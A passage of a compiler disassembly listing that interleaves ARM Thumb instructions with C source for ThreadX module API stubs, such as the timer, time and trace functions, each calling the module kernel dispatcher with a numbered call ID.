 802143e:	681c      	ldr	r4, [r3, #0]
 8021440:	6879      	ldr	r1, [r7, #4]
 8021442:	2300      	movs	r3, #0
 8021444:	2200      	movs	r2, #0
 8021446:	2048      	movs	r0, #72	; 0x48
 8021448:	47a0      	blx	r4
 802144a:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 802144c:	68fb      	ldr	r3, [r7, #12]
}
 802144e:	4618      	mov	r0, r3
 8021450:	3714      	adds	r7, #20
 8021452:	46bd      	mov	sp, r7
 8021454:	bd90      	pop	{r4, r7, pc}
 8021456:	bf00      	nop
 8021458:	00000004 	.word	0x00000004

0802145c <_tx_time_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
ULONG _tx_time_get(VOID)
{
 802145c:	b590      	push	{r4, r7, lr}
 802145e:	b083      	sub	sp, #12
 8021460:	af00      	add	r7, sp, #0

ULONG return_value;

    /* Call module manager dispatcher.  */
    return_value = (ULONG) (_txm_module_kernel_call_dispatcher)(TXM_TIME_GET_CALL, 0, 0, 0);
 8021462:	4b07      	ldr	r3, [pc, #28]	; (8021480 <_tx_time_get+0x24>)
 8021464:	f859 3003 	ldr.w	r3, [r9, r3]
 8021468:	681c      	ldr	r4, [r3, #0]
 802146a:	2300      	movs	r3, #0
 802146c:	2200      	movs	r2, #0
 802146e:	2100      	movs	r1, #0
 8021470:	2049      	movs	r0, #73	; 0x49
 8021472:	47a0      	blx	r4
 8021474:	6078      	str	r0, [r7, #4]

    /* Return value to the caller.  */
    return(return_value);
 8021476:	687b      	ldr	r3, [r7, #4]
}
 8021478:	4618      	mov	r0, r3
 802147a:	370c      	adds	r7, #12
 802147c:	46bd      	mov	sp, r7
 802147e:	bd90      	pop	{r4, r7, pc}
 8021480:	00000004 	.word	0x00000004

08021484 <_tx_time_set>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
VOID _tx_time_set(ULONG new_time)
{
 8021484:	b590      	push	{r4, r7, lr}
 8021486:	b083      	sub	sp, #12
 8021488:	af00      	add	r7, sp, #0
 802148a:	6078      	str	r0, [r7, #4]


    /* Call module manager dispatcher.  */
    (_txm_module_kernel_call_dispatcher)(TXM_TIME_SET_CALL, (ALIGN_TYPE) new_time, 0, 0);
 802148c:	4b06      	ldr	r3, [pc, #24]	; (80214a8 <_tx_time_set+0x24>)
 802148e:	f859 3003 	ldr.w	r3, [r9, r3]
 8021492:	681c      	ldr	r4, [r3, #0]
 8021494:	2300      	movs	r3, #0
 8021496:	2200      	movs	r2, #0
 8021498:	6879      	ldr	r1, [r7, #4]
 802149a:	204a      	movs	r0, #74	; 0x4a
 802149c:	47a0      	blx	r4
}
 802149e:	bf00      	nop
 80214a0:	370c      	adds	r7, #12
 80214a2:	46bd      	mov	sp, r7
 80214a4:	bd90      	pop	{r4, r7, pc}
 80214a6:	bf00      	nop
 80214a8:	00000004 	.word	0x00000004

080214ac <_txe_timer_activate>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_timer_activate(TX_TIMER *timer_ptr)
{
 80214ac:	b590      	push	{r4, r7, lr}
 80214ae:	b085      	sub	sp, #20
 80214b0:	af00      	add	r7, sp, #0
 80214b2:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TIMER_ACTIVATE_CALL, (ALIGN_TYPE) timer_ptr, 0, 0);
 80214b4:	4b07      	ldr	r3, [pc, #28]	; (80214d4 <_txe_timer_activate+0x28>)
 80214b6:	f859 3003 	ldr.w	r3, [r9, r3]
 80214ba:	681c      	ldr	r4, [r3, #0]
 80214bc:	6879      	ldr	r1, [r7, #4]
 80214be:	2300      	movs	r3, #0
 80214c0:	2200      	movs	r2, #0
 80214c2:	204b      	movs	r0, #75	; 0x4b
 80214c4:	47a0      	blx	r4
 80214c6:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 80214c8:	68fb      	ldr	r3, [r7, #12]
}
 80214ca:	4618      	mov	r0, r3
 80214cc:	3714      	adds	r7, #20
 80214ce:	46bd      	mov	sp, r7
 80214d0:	bd90      	pop	{r4, r7, pc}
 80214d2:	bf00      	nop
 80214d4:	00000004 	.word	0x00000004

080214d8 <_txe_timer_change>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_timer_change(TX_TIMER *timer_ptr, ULONG initial_ticks, ULONG reschedule_ticks)
{
 80214d8:	b590      	push	{r4, r7, lr}
 80214da:	b087      	sub	sp, #28
 80214dc:	af00      	add	r7, sp, #0
 80214de:	60f8      	str	r0, [r7, #12]
 80214e0:	60b9      	str	r1, [r7, #8]
 80214e2:	607a      	str	r2, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TIMER_CHANGE_CALL, (ALIGN_TYPE) timer_ptr, (ALIGN_TYPE) initial_ticks, (ALIGN_TYPE) reschedule_ticks);
 80214e4:	4b07      	ldr	r3, [pc, #28]	; (8021504 <_txe_timer_change+0x2c>)
 80214e6:	f859 3003 	ldr.w	r3, [r9, r3]
 80214ea:	681c      	ldr	r4, [r3, #0]
 80214ec:	68f9      	ldr	r1, [r7, #12]
 80214ee:	687b      	ldr	r3, [r7, #4]
 80214f0:	68ba      	ldr	r2, [r7, #8]
 80214f2:	204c      	movs	r0, #76	; 0x4c
 80214f4:	47a0      	blx	r4
 80214f6:	6178      	str	r0, [r7, #20]

    /* Return value to the caller.  */
    return(return_value);
 80214f8:	697b      	ldr	r3, [r7, #20]
}
 80214fa:	4618      	mov	r0, r3
 80214fc:	371c      	adds	r7, #28
 80214fe:	46bd      	mov	sp, r7
 8021500:	bd90      	pop	{r4, r7, pc}
 8021502:	bf00      	nop
 8021504:	00000004 	.word	0x00000004

08021508 <_txe_timer_create>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_timer_create(TX_TIMER *timer_ptr, CHAR *name_ptr, VOID (*expiration_function)(ULONG), ULONG expiration_input, ULONG initial_ticks, ULONG reschedule_ticks, UINT auto_activate, UINT timer_control_block_size)
{
 8021508:	b590      	push	{r4, r7, lr}
 802150a:	b08d      	sub	sp, #52	; 0x34
 802150c:	af00      	add	r7, sp, #0
 802150e:	60f8      	str	r0, [r7, #12]
 8021510:	60b9      	str	r1, [r7, #8]
 8021512:	607a      	str	r2, [r7, #4]
 8021514:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[6];

    extra_parameters[0] = (ALIGN_TYPE) expiration_function;
 8021516:	687b      	ldr	r3, [r7, #4]
 8021518:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) expiration_input;
 802151a:	683b      	ldr	r3, [r7, #0]
 802151c:	61bb      	str	r3, [r7, #24]
    extra_parameters[2] = (ALIGN_TYPE) initial_ticks;
 802151e:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 8021520:	61fb      	str	r3, [r7, #28]
    extra_parameters[3] = (ALIGN_TYPE) reschedule_ticks;
 8021522:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8021524:	623b      	str	r3, [r7, #32]
    extra_parameters[4] = (ALIGN_TYPE) auto_activate;
 8021526:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8021528:	627b      	str	r3, [r7, #36]	; 0x24
    extra_parameters[5] = (ALIGN_TYPE) timer_control_block_size;
 802152a:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 802152c:	62bb      	str	r3, [r7, #40]	; 0x28

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TIMER_CREATE_CALL, (ALIGN_TYPE) timer_ptr, (ALIGN_TYPE) name_ptr, (ALIGN_TYPE) extra_parameters);
 802152e:	4b08      	ldr	r3, [pc, #32]	; (8021550 <_txe_timer_create+0x48>)
 8021530:	f859 3003 	ldr.w	r3, [r9, r3]
 8021534:	681c      	ldr	r4, [r3, #0]
 8021536:	68f9      	ldr	r1, [r7, #12]
 8021538:	68ba      	ldr	r2, [r7, #8]
 802153a:	f107 0314 	add.w	r3, r7, #20
 802153e:	204d      	movs	r0, #77	; 0x4d
 8021540:	47a0      	blx	r4
 8021542:	62f8      	str	r0, [r7, #44]	; 0x2c

    /* Return value to the caller.  */
    return(return_value);
 8021544:	6afb      	ldr	r3, [r7, #44]	; 0x2c
}
 8021546:	4618      	mov	r0, r3
 8021548:	3734      	adds	r7, #52	; 0x34
 802154a:	46bd      	mov	sp, r7
 802154c:	bd90      	pop	{r4, r7, pc}
 802154e:	bf00      	nop
 8021550:	00000004 	.word	0x00000004

08021554 <_txe_timer_deactivate>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_timer_deactivate(TX_TIMER *timer_ptr)
{
 8021554:	b590      	push	{r4, r7, lr}
 8021556:	b085      	sub	sp, #20
 8021558:	af00      	add	r7, sp, #0
 802155a:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TIMER_DEACTIVATE_CALL, (ALIGN_TYPE) timer_ptr, 0, 0);
 802155c:	4b07      	ldr	r3, [pc, #28]	; (802157c <_txe_timer_deactivate+0x28>)
 802155e:	f859 3003 	ldr.w	r3, [r9, r3]
 8021562:	681c      	ldr	r4, [r3, #0]
 8021564:	6879      	ldr	r1, [r7, #4]
 8021566:	2300      	movs	r3, #0
 8021568:	2200      	movs	r2, #0
 802156a:	204e      	movs	r0, #78	; 0x4e
 802156c:	47a0      	blx	r4
 802156e:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8021570:	68fb      	ldr	r3, [r7, #12]
}
 8021572:	4618      	mov	r0, r3
 8021574:	3714      	adds	r7, #20
 8021576:	46bd      	mov	sp, r7
 8021578:	bd90      	pop	{r4, r7, pc}
 802157a:	bf00      	nop
 802157c:	00000004 	.word	0x00000004

08021580 <_txe_timer_delete>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_timer_delete(TX_TIMER *timer_ptr)
{
 8021580:	b590      	push	{r4, r7, lr}
 8021582:	b085      	sub	sp, #20
 8021584:	af00      	add	r7, sp, #0
 8021586:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TIMER_DELETE_CALL, (ALIGN_TYPE) timer_ptr, 0, 0);
 8021588:	4b07      	ldr	r3, [pc, #28]	; (80215a8 <_txe_timer_delete+0x28>)
 802158a:	f859 3003 	ldr.w	r3, [r9, r3]
 802158e:	681c      	ldr	r4, [r3, #0]
 8021590:	6879      	ldr	r1, [r7, #4]
 8021592:	2300      	movs	r3, #0
 8021594:	2200      	movs	r2, #0
 8021596:	204f      	movs	r0, #79	; 0x4f
 8021598:	47a0      	blx	r4
 802159a:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 802159c:	68fb      	ldr	r3, [r7, #12]
}
 802159e:	4618      	mov	r0, r3
 80215a0:	3714      	adds	r7, #20
 80215a2:	46bd      	mov	sp, r7
 80215a4:	bd90      	pop	{r4, r7, pc}
 80215a6:	bf00      	nop
 80215a8:	00000004 	.word	0x00000004

080215ac <_txe_timer_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_timer_info_get(TX_TIMER *timer_ptr, CHAR **name, UINT *active, ULONG *remaining_ticks, ULONG *reschedule_ticks, TX_TIMER **next_timer)
{
 80215ac:	b590      	push	{r4, r7, lr}
 80215ae:	b08b      	sub	sp, #44	; 0x2c
 80215b0:	af00      	add	r7, sp, #0
 80215b2:	60f8      	str	r0, [r7, #12]
 80215b4:	60b9      	str	r1, [r7, #8]
 80215b6:	607a      	str	r2, [r7, #4]
 80215b8:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[4];

    extra_parameters[0] = (ALIGN_TYPE) active;
 80215ba:	687b      	ldr	r3, [r7, #4]
 80215bc:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) remaining_ticks;
 80215be:	683b      	ldr	r3, [r7, #0]
 80215c0:	61bb      	str	r3, [r7, #24]
    extra_parameters[2] = (ALIGN_TYPE) reschedule_ticks;
 80215c2:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80215c4:	61fb      	str	r3, [r7, #28]
    extra_parameters[3] = (ALIGN_TYPE) next_timer;
 80215c6:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 80215c8:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TIMER_INFO_GET_CALL, (ALIGN_TYPE) timer_ptr, (ALIGN_TYPE) name, (ALIGN_TYPE) extra_parameters);
 80215ca:	4b08      	ldr	r3, [pc, #32]	; (80215ec <_txe_timer_info_get+0x40>)
 80215cc:	f859 3003 	ldr.w	r3, [r9, r3]
 80215d0:	681c      	ldr	r4, [r3, #0]
 80215d2:	68f9      	ldr	r1, [r7, #12]
 80215d4:	68ba      	ldr	r2, [r7, #8]
 80215d6:	f107 0314 	add.w	r3, r7, #20
 80215da:	2050      	movs	r0, #80	; 0x50
 80215dc:	47a0      	blx	r4
 80215de:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 80215e0:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 80215e2:	4618      	mov	r0, r3
 80215e4:	372c      	adds	r7, #44	; 0x2c
 80215e6:	46bd      	mov	sp, r7
 80215e8:	bd90      	pop	{r4, r7, pc}
 80215ea:	bf00      	nop
 80215ec:	00000004 	.word	0x00000004

080215f0 <_tx_timer_performance_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_timer_performance_info_get(TX_TIMER *timer_ptr, ULONG *activates, ULONG *reactivates, ULONG *deactivates, ULONG *expirations, ULONG *expiration_adjusts)
{
 80215f0:	b590      	push	{r4, r7, lr}
 80215f2:	b08b      	sub	sp, #44	; 0x2c
 80215f4:	af00      	add	r7, sp, #0
 80215f6:	60f8      	str	r0, [r7, #12]
 80215f8:	60b9      	str	r1, [r7, #8]
 80215fa:	607a      	str	r2, [r7, #4]
 80215fc:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[4];

    extra_parameters[0] = (ALIGN_TYPE) reactivates;
 80215fe:	687b      	ldr	r3, [r7, #4]
 8021600:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) deactivates;
 8021602:	683b      	ldr	r3, [r7, #0]
 8021604:	61bb      	str	r3, [r7, #24]
    extra_parameters[2] = (ALIGN_TYPE) expirations;
 8021606:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8021608:	61fb      	str	r3, [r7, #28]
    extra_parameters[3] = (ALIGN_TYPE) expiration_adjusts;
 802160a:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 802160c:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TIMER_PERFORMANCE_INFO_GET_CALL, (ALIGN_TYPE) timer_ptr, (ALIGN_TYPE) activates, (ALIGN_TYPE) extra_parameters);
 802160e:	4b08      	ldr	r3, [pc, #32]	; (8021630 <_tx_timer_performance_info_get+0x40>)
 8021610:	f859 3003 	ldr.w	r3, [r9, r3]
 8021614:	681c      	ldr	r4, [r3, #0]
 8021616:	68f9      	ldr	r1, [r7, #12]
 8021618:	68ba      	ldr	r2, [r7, #8]
 802161a:	f107 0314 	add.w	r3, r7, #20
 802161e:	2051      	movs	r0, #81	; 0x51
 8021620:	47a0      	blx	r4
 8021622:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 8021624:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 8021626:	4618      	mov	r0, r3
 8021628:	372c      	adds	r7, #44	; 0x2c
 802162a:	46bd      	mov	sp, r7
 802162c:	bd90      	pop	{r4, r7, pc}
 802162e:	bf00      	nop
 8021630:	00000004 	.word	0x00000004

08021634 <_tx_timer_performance_system_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_timer_performance_system_info_get(ULONG *activates, ULONG *reactivates, ULONG *deactivates, ULONG *expirations, ULONG *expiration_adjusts)
{
 8021634:	b590      	push	{r4, r7, lr}
 8021636:	b089      	sub	sp, #36	; 0x24
 8021638:	af00      	add	r7, sp, #0
 802163a:	60f8      	str	r0, [r7, #12]
 802163c:	60b9      	str	r1, [r7, #8]
 802163e:	607a      	str	r2, [r7, #4]
 8021640:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[3];

    extra_parameters[0] = (ALIGN_TYPE) deactivates;
 8021642:	687b      	ldr	r3, [r7, #4]
 8021644:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) expirations;
 8021646:	683b      	ldr	r3, [r7, #0]
 8021648:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) expiration_adjusts;
 802164a:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 802164c:	61bb      	str	r3, [r7, #24]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TIMER_PERFORMANCE_SYSTEM_INFO_GET_CALL, (ALIGN_TYPE) activates, (ALIGN_TYPE) reactivates, (ALIGN_TYPE) extra_parameters);
 802164e:	4b08      	ldr	r3, [pc, #32]	; (8021670 <_tx_timer_performance_system_info_get+0x3c>)
 8021650:	f859 3003 	ldr.w	r3, [r9, r3]
 8021654:	681c      	ldr	r4, [r3, #0]
 8021656:	68f9      	ldr	r1, [r7, #12]
 8021658:	68ba      	ldr	r2, [r7, #8]
 802165a:	f107 0310 	add.w	r3, r7, #16
 802165e:	2052      	movs	r0, #82	; 0x52
 8021660:	47a0      	blx	r4
 8021662:	61f8      	str	r0, [r7, #28]

    /* Return value to the caller.  */
    return(return_value);
 8021664:	69fb      	ldr	r3, [r7, #28]
}
 8021666:	4618      	mov	r0, r3
 8021668:	3724      	adds	r7, #36	; 0x24
 802166a:	46bd      	mov	sp, r7
 802166c:	bd90      	pop	{r4, r7, pc}
 802166e:	bf00      	nop
 8021670:	00000004 	.word	0x00000004

08021674 <_tx_trace_buffer_full_notify>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_trace_buffer_full_notify(VOID (*full_buffer_callback)(VOID *buffer))
{
 8021674:	b590      	push	{r4, r7, lr}
 8021676:	b085      	sub	sp, #20
 8021678:	af00      	add	r7, sp, #0
 802167a:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TRACE_BUFFER_FULL_NOTIFY_CALL, (ALIGN_TYPE) full_buffer_callback, 0, 0);
 802167c:	4b07      	ldr	r3, [pc, #28]	; (802169c <_tx_trace_buffer_full_notify+0x28>)
 802167e:	f859 3003 	ldr.w	r3, [r9, r3]
 8021682:	681c      	ldr	r4, [r3, #0]
 8021684:	6879      	ldr	r1, [r7, #4]
 8021686:	2300      	movs	r3, #0
 8021688:	2200      	movs	r2, #0
 802168a:	205a      	movs	r0, #90	; 0x5a
 802168c:	47a0      	blx	r4
 802168e:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8021690:	68fb      	ldr	r3, [r7, #12]
}
 8021692:	4618      	mov	r0, r3
 8021694:	3714      	adds	r7, #20
 8021696:	46bd      	mov	sp, r7
 8021698:	bd90      	pop	{r4, r7, pc}
 802169a:	bf00      	nop
 802169c:	00000004 	.word	0x00000004

080216a0 <_tx_trace_disable>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_trace_disable(VOID)
{
 80216a0:	b590      	push	{r4, r7, lr}
 80216a2:	b083      	sub	sp, #12
 80216a4:	af00      	add	r7, sp, #0

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TRACE_DISABLE_CALL, 0, 0, 0);
 80216a6:	4b07      	ldr	r3, [pc, #28]	; (80216c4 <_tx_trace_disable+0x24>)
 80216a8:	f859 3003 	ldr.w	r3, [r9, r3]
 80216ac:	681c      	ldr	r4, [r3, #0]
 80216ae:	2300      	movs	r3, #0
 80216b0:	2200      	movs	r2, #0
 80216b2:	2100      	movs	r1, #0
 80216b4:	2056      	movs	r0, #86	; 0x56
 80216b6:	47a0      	blx	r4
 80216b8:	6078      	str	r0, [r7, #4]

    /* Return value to the caller.  */
    return(return_value);
 80216ba:	687b      	ldr	r3, [r7, #4]
}
 80216bc:	4618      	mov	r0, r3
 80216be:	370c      	adds	r7, #12
 80216c0:	46bd      	mov	sp, r7
 80216c2:	bd90      	pop	{r4, r7, pc}
 80216c4:	00000004 	.word	0x00000004

080216c8 <_tx_trace_enable>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_trace_enable(VOID *trace_buffer_start, ULONG trace_buffer_size, ULONG registry_entries)
{
 80216c8:	b590      	push	{r4, r7, lr}
 80216ca:	b087      	sub	sp, #28
 80216cc:	af00      	add	r7, sp, #0
 80216ce:	60f8      	str	r0, [r7, #12]
 80216d0:	60b9      	str	r1, [r7, #8]
 80216d2:	607a      	str	r2, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TRACE_ENABLE_CALL, (ALIGN_TYPE) trace_buffer_start, (ALIGN_TYPE) trace_buffer_size, (ALIGN_TYPE) registry_entries);
 80216d4:	4b07      	ldr	r3, [pc, #28]	; (80216f4 <_tx_trace_enable+0x2c>)
 80216d6:	f859 3003 	ldr.w	r3, [r9, r3]
 80216da:	681c      	ldr	r4, [r3, #0]
 80216dc:	68f9      	ldr	r1, [r7, #12]
 80216de:	687b      	ldr	r3, [r7, #4]
 80216e0:	68ba      	ldr	r2, [r7, #8]
 80216e2:	2053      	movs	r0, #83	; 0x53
 80216e4:	47a0      	blx	r4
 80216e6:	6178      	str	r0, [r7, #20]

    /* Return value to the caller.  */
    return(return_value);
 80216e8:	697b      	ldr	r3, [r7, #20]
}
 80216ea:	4618      	mov	r0, r3
 80216ec:	371c      	adds	r7, #28
 80216ee:	46bd      	mov	sp, r7
 80216f0:	bd90      	pop	{r4, r7, pc}
 80216f2:	bf00      	nop
 80216f4:	00000004 	.word	0x00000004

080216f8 <_tx_trace_event_filter>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_trace_event_filter(ULONG event_filter_bits)
{
 80216f8:	b590      	push	{r4, r7, lr}
 80216fa:	b085      	sub	sp, #20
 80216fc:	af00      	add	r7, sp, #0
 80216fe:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TRACE_EVENT_FILTER_CALL, (ALIGN_TYPE) event_filter_bits, 0, 0);
 8021700:	4b07      	ldr	r3, [pc, #28]	; (8021720 <_tx_trace_event_filter+0x28>)
 8021702:	f859 3003 	ldr.w	r3, [r9, r3]
 8021706:	681c      	ldr	r4, [r3, #0]
 8021708:	2300      	movs	r3, #0
 802170a:	2200      	movs	r2, #0
 802170c:	6879      	ldr	r1, [r7, #4]
 802170e:	2054      	movs	r0, #84	; 0x54
 8021710:	47a0      	blx	r4
 8021712:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8021714:	68fb      	ldr	r3, [r7, #12]
}
 8021716:	4618      	mov	r0, r3
 8021718:	3714      	adds	r7, #20
 802171a:	46bd      	mov	sp, r7
 802171c:	bd90      	pop	{r4, r7, pc}
 802171e:	bf00      	nop
 8021720:	00000004 	.word	0x00000004

08021724 <_tx_trace_event_unfilter>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_trace_event_unfilter(ULONG event_unfilter_bits)
{
 8021724:	b590      	push	{r4, r7, lr}
 8021726:	b085      	sub	sp, #20
 8021728:	af00      	add	r7, sp, #0
 802172a:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TRACE_EVENT_UNFILTER_CALL, (ALIGN_TYPE) event_unfilter_bits, 0, 0);
 802172c:	4b07      	ldr	r3, [pc, #28]	; (802174c <_tx_trace_event_unfilter+0x28>)
 802172e:	f859 3003 	ldr.w	r3, [r9, r3]
 8021732:	681c      	ldr	r4, [r3, #0]
 8021734:	2300      	movs	r3, #0
 8021736:	2200      	movs	r2, #0
 8021738:	6879      	ldr	r1, [r7, #4]
 802173a:	2055      	movs	r0, #85	; 0x55
 802173c:	47a0      	blx	r4
 802173e:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8021740:	68fb      	ldr	r3, [r7, #12]
}
 8021742:	4618      	mov	r0, r3
 8021744:	3714      	adds	r7, #20
 8021746:	46bd      	mov	sp, r7
 8021748:	bd90      	pop	{r4, r7, pc}
 802174a:	bf00      	nop
 802174c:	00000004 	.word	0x00000004

08021750 <_tx_trace_interrupt_control>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_trace_interrupt_control(UINT new_posture)
{
 8021750:	b590      	push	{r4, r7, lr}
 8021752:	b085      	sub	sp, #20
 8021754:	af00      	add	r7, sp, #0
 8021756:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TRACE_INTERRUPT_CONTROL_CALL, (ALIGN_TYPE) new_posture, 0, 0);
 8021758:	4b07      	ldr	r3, [pc, #28]	; (8021778 <_tx_trace_interrupt_control+0x28>)
 802175a:	f859 3003 	ldr.w	r3, [r9, r3]
 802175e:	681c      	ldr	r4, [r3, #0]
 8021760:	2300      	movs	r3, #0
 8021762:	2200      	movs	r2, #0
 8021764:	6879      	ldr	r1, [r7, #4]
 8021766:	2057      	movs	r0, #87	; 0x57
 8021768:	47a0      	blx	r4
 802176a:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 802176c:	68fb      	ldr	r3, [r7, #12]
}
 802176e:	4618      	mov	r0, r3
 8021770:	3714      	adds	r7, #20
 8021772:	46bd      	mov	sp, r7
 8021774:	bd90      	pop	{r4, r7, pc}
 8021776:	bf00      	nop
 8021778:	00000004 	.word	0x00000004

0802177c <_tx_trace_isr_enter_insert>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
VOID _tx_trace_isr_enter_insert(ULONG isr_id)
{
 802177c:	b590      	push	{r4, r7, lr}
 802177e:	b083      	sub	sp, #12
 8021780:	af00      	add	r7, sp, #0
 8021782:	6078      	str	r0, [r7, #4]


    /* Call module manager dispatcher.  */
    (_txm_module_kernel_call_dispatcher)(TXM_TRACE_ISR_ENTER_INSERT_CALL, (ALIGN_TYPE) isr_id, 0, 0);
 8021784:	4b06      	ldr	r3, [pc, #24]	; (80217a0 <_tx_trace_isr_enter_insert+0x24>)
 8021786:	f859 3003 	ldr.w	r3, [r9, r3]
 802178a:	681c      	ldr	r4, [r3, #0]
 802178c:	2300      	movs	r3, #0
 802178e:	2200      	movs	r2, #0
 8021790:	6879      	ldr	r1, [r7, #4]
 8021792:	2058      	movs	r0, #88	; 0x58
 8021794:	47a0      	blx	r4
}
 8021796:	bf00      	nop
 8021798:	370c      	adds	r7, #12
 802179a:	46bd      	mov	sp, r7
 802179c:	bd90      	pop	{r4, r7, pc}
 802179e:	bf00      	nop
 80217a0:	00000004 	.word	0x00000004

080217a4 <_tx_trace_isr_exit_insert>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
VOID _tx_trace_isr_exit_insert(ULONG isr_id)
{
 80217a4:	b590      	push	{r4, r7, lr}
 80217a6:	b083      	sub	sp, #12
 80217a8:	af00      	add	r7, sp, #0
 80217aa:	6078      	str	r0, [r7, #4]


    /* Call module manager dispatcher.  */
    (_txm_module_kernel_call_dispatcher)(TXM_TRACE_ISR_EXIT_INSERT_CALL, (ALIGN_TYPE) isr_id, 0, 0);
 80217ac:	4b06      	ldr	r3, [pc, #24]	; (80217c8 <_tx_trace_isr_exit_insert+0x24>)
 80217ae:	f859 3003 	ldr.w	r3, [r9, r3]
 80217b2:	681c      	ldr	r4, [r3, #0]
 80217b4:	2300      	movs	r3, #0
 80217b6:	2200      	movs	r2, #0
